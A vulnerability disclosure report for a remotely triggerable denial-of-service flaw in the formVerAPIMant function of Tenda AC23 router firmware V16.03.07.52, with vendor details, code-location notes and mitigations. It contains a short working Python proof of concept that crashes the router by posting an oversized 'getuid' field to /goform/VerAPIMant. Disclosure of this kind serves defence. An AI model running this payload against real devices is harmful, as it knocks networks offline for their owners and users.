# Vulnerability Title
Denial of Service Vulnerability in the `formVerAPIMant` Function of Tenda AC23 Router  

# Vulnerability Details
## Description
A binary vulnerability exists in Tenda AC23 firmware version V16.03.07.52. Attackers can exploit this vulnerability by sending malicious requests to a specific API interface, causing the device's CPU to overload and the router to crash, rendering it inaccessible. This vulnerability can be triggered remotely, leading to service disruption and affecting the normal operation of network devices.  

### Vendor Information
+ **Vendor Name (Chinese)**: 深圳市吉祥腾达科技有限公司
+ **Vendor Name (English)**: Shenzhen Tenda Technology Co., Ltd.  
+ **Official Website**: [https://www.tenda.com.cn](https://www.tenda.com.cn)  
+ **Affected Product and Version**: Tenda AC23 V16.03.07.52  
+ **Affected Device Type**: Network devices (e.g., routers, switches)

### Vendor Information Screenshots
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739873653516-0f658861-6adb-4598-8738-37985560893d.png)  

![](file-XkX9KWK8HnCCZrtpck8R5z.png)  

## Vulnerability Type
Denial of Service (DoS)  

## Vulnerability Verification Process
1. **Firmware Download**: [Tenda AC23 Firmware Download](https://www.tenda.com.cn/download/detail-3889.html)  
2. **Reproduction Steps**:  
Attackers can trigger the vulnerability by sending specially crafted malicious requests, causing the router to crash and become unresponsive. Below is an example of the attack code:

```python
import requests

url = "http://192.168.85.160/goform/VerAPIMant"
data = {
    "getuid": b'A' * 1000000000  # Construct oversized data
}

res = requests.post(url=url, data=data)
print(res.content)
```

3. **Attack Results**:  
    - The router's CPU usage spikes to 100%, causing the device to crash.  
    - The router becomes inaccessible and cannot be restored via the web interface.

### Firmware Download Page Screenshots
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739873659104-7e1dbd67-6e2e-4592-ac52-ca289e766c70.png)  

![](file-1qQZQXMchqe8VFraVjtxux.png)  

### Vulnerability Trigger Results Screenshots
+ The following screenshots show the router's interface after the attack, indicating network failure.  
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739873793085-d0adeb88-7d57-4a21-8c41-fa3856b65ec2.png)  
![](file-5Lj4uUnRz5b9QUNqdD4xyM.png)

### Attack Process and Code Analysis Screenshots
1. **Vulnerability Code Analysis**:  
The vulnerability occurs in the `formVerAPIMant` function, which fails to validate the `getuid` parameter properly. Oversized input data causes the system to crash. The screenshots below show the relevant code snippets:  
    1. ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739873688247-cda64646-58fc-4ed4-b1fb-ca9b1a4bef9d.png)  
    2. ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739873781425-0490fa23-dda8-4c39-8102-77ef646b9705.png)
2. **Attack Execution Screenshots**:  
The screenshots below show the command-line output after executing the attack, confirming the successful triggering of the vulnerability.  
    1. ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739873766382-fce77166-de28-4c07-81bb-6703eafde838.png)  
![](file-BMDL3mJGH1edisMffAXBWp.png)

### CPU Usage Screenshots
+ After triggering the attack, the router's CPU usage reaches 100%, as shown in the screenshots below.  
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739873810919-2a7d829f-6ca9-4dae-a589-04c3c8bbb4a6.png)  
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739873738489-b0df5640-bb2a-4999-8658-518c5d5e7044.png)  
![](file-Wc5Q3iz5XdSkMyDezKnWTF.png)

## Vulnerability Location
+ The vulnerability resides in the `formVerAPIMant` function, which lacks proper validation for the `getuid` parameter. Attackers can crash the system by sending excessively large data packets.

## Vulnerability Impact
+ Attackers can exploit this vulnerability to disrupt device services.  
+ In multi-device environments, this vulnerability may cause prolonged network outages, severely affecting service stability.

# Mitigation Strategies
+ **Temporary Solution**:  
Limit oversized input to prevent the sending of abnormally large data packets.  
+ **Permanent Solution**:  
Fix the vulnerability in subsequent firmware updates by implementing proper input size validation to ensure the system can handle reasonable input sizes and prevent similar attacks.

****
